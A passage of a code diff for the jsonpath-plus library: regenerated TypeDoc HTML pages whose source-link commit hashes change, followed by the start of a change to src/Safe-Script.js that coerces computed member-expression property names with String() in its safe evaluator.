class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n+<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathCallback | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathCallback.html\">JSONPathCallback</a></li></ul><h1>Type Alias JSONPathCallback</h1></div><div class=\"tsd-signature\"><span class=\"tsd-kind-type-alias\">JSONPath<wbr/>Callback</span><span class=\"tsd-signature-symbol\">:</span> <span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">payload</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span>, <span class=\"tsd-kind-parameter\">payloadType</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span>, <span class=\"tsd-kind-parameter\">fullPayload</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\"> =&gt; </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">)</span></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L5\">jsonpath.d.ts:5</a></li></ul></aside></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n```\n\nFilename: docs/ts/types/JSONPathOtherTypeCallback.html:\n```\n@@ -1 +1 @@\n-<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathOtherTypeCallback | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathOtherTypeCallback.html\">JSONPathOtherTypeCallback</a></li></ul><h1>Type Alias JSONPathOtherTypeCallback</h1></div><div class=\"tsd-signature\"><span class=\"tsd-kind-type-alias\">JSONPath<wbr/>Other<wbr/>Type<wbr/>Callback</span><span class=\"tsd-signature-symbol\">:</span> <span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">...</span><span class=\"tsd-kind-parameter\">args</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\"> =&gt; </span><span class=\"tsd-signature-type\">void</span><span class=\"tsd-signature-symbol\">)</span></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L9\">jsonpath.d.ts:9</a></li></ul></aside></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n+<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathOtherTypeCallback | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathOtherTypeCallback.html\">JSONPathOtherTypeCallback</a></li></ul><h1>Type Alias JSONPathOtherTypeCallback</h1></div><div class=\"tsd-signature\"><span class=\"tsd-kind-type-alias\">JSONPath<wbr/>Other<wbr/>Type<wbr/>Callback</span><span class=\"tsd-signature-symbol\">:</span> <span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-signature-symbol\">...</span><span class=\"tsd-kind-parameter\">args</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\"> =&gt; </span><span class=\"tsd-signature-type\">void</span><span class=\"tsd-signature-symbol\">)</span></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L9\">jsonpath.d.ts:9</a></li></ul></aside></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n```\n\nFilename: docs/ts/types/JSONPathType.html:\n```\n@@ -1 +1 @@\n-<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathType | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathType.html\">JSONPathType</a></li></ul><h1>Type Alias JSONPathType</h1></div><div class=\"tsd-signature\"><span class=\"tsd-kind-type-alias\">JSONPath<wbr/>Type</span><span class=\"tsd-signature-symbol\">:</span> <a href=\"../interfaces/JSONPathCallable.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathCallable</a><span class=\"tsd-signature-symbol\"> &amp; </span><a href=\"../classes/JSONPathClass.html\" class=\"tsd-signature-type tsd-kind-class\">JSONPathClass</a></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L223\">jsonpath.d.ts:223</a></li></ul></aside></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n+<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPathType | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPathType.html\">JSONPathType</a></li></ul><h1>Type Alias JSONPathType</h1></div><div class=\"tsd-signature\"><span class=\"tsd-kind-type-alias\">JSONPath<wbr/>Type</span><span class=\"tsd-signature-symbol\">:</span> <a href=\"../interfaces/JSONPathCallable.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathCallable</a><span class=\"tsd-signature-symbol\"> &amp; </span><a href=\"../classes/JSONPathClass.html\" class=\"tsd-signature-type tsd-kind-class\">JSONPathClass</a></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L223\">jsonpath.d.ts:223</a></li></ul></aside></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n```\n\nFilename: src/Safe-Script.js:\n```\n@@ -115,9 +115,14 @@\nconst SafeEval = {\n         return ast.value;\n     },\n     evalMemberExpression (ast, subs) {\n-        const prop = ast.computed\n-            ? SafeEval.evalAst(ast.property) // `object[property]`\n-            : ast.property.name; // `object.property` property is Identifier\n+        const prop = String(\n+            // NOTE: `String(value)` throws error when\n+            // value has overwritten the toString method to return non-string\n+            // i.e. `value = {toString: () => []}`\n+ 